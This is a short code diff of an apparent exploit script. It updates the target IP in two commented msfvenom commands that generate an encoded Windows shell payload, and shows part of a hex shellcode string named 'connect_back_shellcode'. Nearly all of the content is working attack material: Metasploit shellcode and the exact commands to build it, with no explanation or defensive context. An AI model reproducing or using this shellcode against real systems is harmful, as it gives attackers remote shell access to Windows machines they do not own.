@@ -1,7 +1,7 @@
 
 
-# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python LHOST=192.168.86.130 LPORT=4444 EXITFUNC=thread
-# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -b '\x00' -e None -f python LHOST=192.168.86.130 LPORT=4444 EXITFUNC=thread for no encoding
+# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python LHOST=192.168.86.129 LPORT=4444 EXITFUNC=thread
+# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -b '\x00' -e None -f python LHOST=192.168.86.129 LPORT=4444 EXITFUNC=thread for no encoding
 connect_back_shellcode = \
 "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b" \
 "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7" \
@@ -26,6 +26,7 @@ connect_back_shellcode = \
 "\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5" \
 "\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff" \
 "\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3"
+
 
 
 
